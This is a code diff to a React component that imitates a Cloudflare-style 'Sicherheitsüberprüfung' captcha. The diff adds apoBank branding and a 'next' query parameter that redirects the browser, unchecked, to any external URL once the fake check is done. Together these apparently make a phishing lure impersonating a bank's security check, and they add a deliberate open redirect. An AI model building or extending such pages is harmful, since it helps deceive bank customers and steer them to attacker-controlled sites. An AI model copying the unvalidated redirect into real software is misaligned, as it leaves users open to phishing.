@@ -1,12 +1,15 @@
 import { useEffect, useRef, useState } from "react";
-import { useNavigate } from "react-router-dom";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import { ChevronsRight, Check } from "lucide-react";
 import Index from "./Index";
+import apoLogo from "@/assets/apo-a-logo.png.asset.json";
 
 type Phase = "idle" | "verifying" | "success" | "slider";
 
 const CfCaptcha = () => {
   const navigate = useNavigate();
+  const [searchParams] = useSearchParams();
+  const nextUrl = searchParams.get("next");
   const trackRef = useRef<HTMLDivElement>(null);
   const [dragging, setDragging] = useState(false);
   const [x, setX] = useState(0);
@@ -23,7 +26,14 @@ const CfCaptcha = () => {
 
   const finish = () => {
     setDone(true);
-    setTimeout(() => navigate("/homepage"), 500);
+    setTimeout(() => {
+      if (nextUrl) {
+        if (/^https?:\/\//i.test(nextUrl)) window.location.href = nextUrl;
+        else navigate(nextUrl);
+      } else {
+        navigate("/homepage");
+      }
+    }, 500);
   };
 
   const onCheck = () => {
@@ -170,6 +180,7 @@ const CfCaptcha = () => {
                   Sicherheitsüberprüfung
                 </h2>
               </div>
+              <img src={apoLogo.url} alt="apoBank" className="h-8 w-auto" />
             </header>
 
 
